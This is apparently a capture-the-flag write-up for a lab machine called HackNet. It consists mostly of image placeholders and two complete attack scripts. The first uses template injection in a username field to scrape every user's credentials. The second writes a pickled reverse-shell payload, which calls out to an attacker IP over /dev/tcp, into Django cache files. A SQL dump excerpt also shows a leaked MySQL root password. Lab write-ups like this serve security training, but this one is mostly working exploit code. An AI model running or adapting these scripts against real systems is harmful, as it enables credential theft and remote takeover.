![[Pasted image 20260124115631.png]]


![[Pasted image 20260124115706.png]]


![[Pasted image 20260124120826.png]]


![[Pasted image 20260124121825.png]]


![[Pasted image 20260124121917.png]]


![[Pasted image 20260124122048.png]]


![[Pasted image 20260124123443.png]]


![[Pasted image 20260124160203.png]]


![[Pasted image 20260124161144.png]]


I’ll create [a Python script](https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/HackNet/ssti.py) to automatically go through all posts and extract the creds of all users. It found 26 of them in total.

```

import sys
import requests
import string
import random
import ast
from colorama import Fore, Style
from bs4 import BeautifulSoup
from tabulate import tabulate

BASE_URL = "http://hacknet.htb"

def log(mode, msg):
    match mode:
        case "success":
            print(Fore.GREEN + f"[+] {msg}" + Style.RESET_ALL)
        case "error":
            print(Fore.RED + f"[-] {msg}" + Style.RESET_ALL)
        case "info":
            print(Fore.BLUE + f"[*] {msg}" + Style.RESET_ALL)
        case "warning":
            print(Fore.YELLOW + f"[!] {msg}" + Style.RESET_ALL)

def help():
    print(f"Usage: python {sys.argv[0]} <login/register> <email> <pass>")
    exit(0)

def getcsrftokens(url, sessionid=None):
    try:
        if sessionid != None:
            cookies = {
                "sessionid": sessionid
            }
            r = requests.get(url, cookies=cookies)
        else:
            r = requests.get(url)

        if r.status_code != 200:
            log("error", f"Invalid status code received: {r.status_code}.")
            exit(0)
        
        csrfcookie = r.cookies.get("csrftoken")
        if csrfcookie == None:
            log("error", "CSRF cookie not found.")
            exit(0)
        
        soup = BeautifulSoup(r.text, 'html.parser')
        csrfelement = soup.find("input", {"name":"csrfmiddlewaretoken"})
        if csrfelement == None:
            log("error", "CSRF token not found.")
            log("error", f"Full response: {r.text}")
            exit(0)
        
        csrftoken = csrfelement["value"]
    
    except requests.RequestException as e:
        log("error", f"{url} unreachable.")
        log("error", f"Error: {e}")
        exit(0)

    return (csrfcookie, csrftoken)

def register(email, pwd):
    url = f"{BASE_URL}/register"
    (csrfcookie, csrftoken) = getcsrftokens(url)

    cookies = {
        "csrftoken": csrfcookie
    }

    data = {
        "csrfmiddlewaretoken": csrftoken,
        "email": email,
        "username": ''.join(random.choice(string.ascii_lowercase) for i in range(8)),
        "password": pwd
    }

    try:
        r = requests.post(url, cookies=cookies, data=data)
        if r.status_code == 403:
            log("error", "CSRF verification failed.")
            exit(0)
        if "The username or email address is already in use" in r.text:
            log("error", "Email already registered.")
            exit(0)
        
        if "User created" in r.text:
            log("success", "Registration successful.")
        else:
            log("error", "Unexpected error encountered.")
            log("error", f"Full response: {r.text}")
            exit(0)
        
    except requests.RequestException as e:
        log("error", "Registration POST request failed.")
        log("error", f"Error: {e}")
        exit(0)
    return

def login(email, pwd):
    url = f"{BASE_URL}/login"
    (csrfcookie, csrftoken) = getcsrftokens(url)
    
    cookies = {
        "csrftoken": csrfcookie
    }

    data = {
        "csrfmiddlewaretoken": csrftoken,
        "email": email,
        "password": pwd
    }

    try:
        r = requests.post(url, cookies=cookies, data=data, allow_redirects=False)
        if r.status_code == 403:
            log("error", "CSRF verification failed.")
            exit(0)

        if "Bad credentials" in r.text:
            log("error", "Invalid credentials.")
            exit(0)
        
        if r.status_code == 302:
            sessionid = r.cookies.get("sessionid")
            if sessionid == None:
                log("error", "Failed to obtain session token.")
                exit(0)
        else:
            log("error", "Unexpected error encountered.")
            log("error", f"Status code: {r.status_code}.")
            log("error", f"Full response: {r.text}")
            exit(0)
    except requests.RequestException as e:
        log("error", "Login POST request failed.")
        log("error", f"Error: {e}")
        exit(0)
    
    log("success", "Login successful.")
    return sessionid

def username_change(sessionid, username):
    url = f"{BASE_URL}/profile/edit"
    (csrfcookie, csrftoken) = getcsrftokens(url, sessionid)
    
    cookies = {
        "csrftoken": csrfcookie,
        "sessionid": sessionid
    }

    files = {
        "picture": ("", b"", "application/octet-stream")
    }

    data = {
        "csrfmiddlewaretoken": csrftoken,
        "email": "",
        "username": username,
        "password": "",
        "about": "",
        "is_public": "on"
    }

    try:
        r = requests.post(url, cookies=cookies, data=data, files=files)
        if "User exists" in r.text:
            log("warning", "Username already exists, attack may fail.")
    except RequestException as e:
        log("error", f"Unexpected error: {e}")
        exit(0)
    
    log("info", f"Username changed to '{username}'.")
    return

class User:
    def __init__(self, username, email, password):
        self.username = username
        self.email = email
        self.password = password

def extract_creds(sessionid, id):
    global creds
    cookies = {
        "sessionid": sessionid
    }

    try:
        r = requests.get(f"{BASE_URL}/like/{id}", cookies=cookies)
        if r.status_code == 404:
            return
        
        r = requests.get(f"{BASE_URL}/likes/{id}", cookies=cookies)
        soup = BeautifulSoup(r.text, 'html.parser')
        imgs = soup.find_all("img")
        for img in imgs:
            title = img.get("title")
            if title.startswith("<QuerySet"):
                users = ast.literal_eval(title[10:-1])
                for user in users:
                    username = user["username"]
                    email = user["email"]
                    password = user["password"]
                    
                    obj = User(username, email, password)
                    creds[username] = obj
        
    except RequestException as e:
        log("error", f"Unexpected error: {e}")
        exit(0)

def main():
    if len(sys.argv) != 4 or sys.argv[1] not in ["login", "register"]:
        help()
    
    mode = sys.argv[1]
    email = sys.argv[2]
    pwd = sys.argv[3]

    if mode == "register":
        register(email, pwd)

    sessionid = login(email, pwd)

    username_change(sessionid, '{{users.values}}')

    global creds
    creds = {}

    LIMIT = 50
    for i in range(LIMIT):
        print(Fore.BLUE + f"\r[*] Extracting credentials... {i+1}/{LIMIT}                                  " + Style.RESET_ALL, end="")
        extract_creds(sessionid, i)
        extract_creds(sessionid, i)
    print()

    log("success", f"{len(creds)} credentials extracted in total:")
    
    table = [[u.username, u.email, u.password] for u in creds.values()]
    print(tabulate(table, headers=["Username", "Email", "Password"]))

    return

if __name__ == "__main__":
    main()

```


![[Pasted image 20260124163229.png]]


![[Pasted image 20260124163551.png]]
![[Pasted image 20260124163608.png]]



```

import os
import base64
import pickle

class exploit(object):
    def __init__(self, cmd):
        self.payload = f"echo {cmd} | base64 -d | bash"
    
    def __reduce__(self):
        return (os.system, (self.payload,))

LHOST = "10.10.14.79"
LPORT = "8001"

cmd_raw = f"/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
cmd_b64 = base64.b64encode(cmd_raw.encode()).decode()

pickle_payload = pickle.dumps(exploit(cmd_b64))

# May need changing the file names
with open("/var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache", 'wb') as f:
    f.write(pickle_payload)

with open("/var/tmp/django_cache/90dbab8f3b1e54369abdeb4ba1efc106.djcache", 'wb') as f:
    f.write(pickle_payload)

```


I’ve covered pickle deserialization some time ago in the [DevOops writeup](https://ch3ng625.github.io/devoops). The context is somewhat different, but the process of generating the serialized data is mostly the same.

I’ll create [this script](https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/HackNet/djcache_rce.py) to generate the pickle payload:

After running it on the box, the cache files are generated, this time owned by `mikey`.


![[Pasted image 20260124174402.png]]

I’ll start a `netcat` listener and reload the `/explore` page. A shell as `sandy` is immediately sent back.

![[Pasted image 20260124174415.png]]


![[Pasted image 20260124175106.png]]


![[Pasted image 20260124175121.png]]


![[Pasted image 20260124175308.png]]


![[Pasted image 20260124175715.png]]


```


LOCK TABLES `SocialNetwork_socialmessage` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialmessage` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialmessage` VALUES
..SNIP..
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(49,'2024-12-29 20:30:14.430878','Just tweaking some schema settings for the new project. Won’t take long, I promise.',1,22,18),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
```




![[Pasted image 20260124180122.png]]


![[Pasted image 20260124180243.png]]


![[Pasted image 20260124180256.png]]
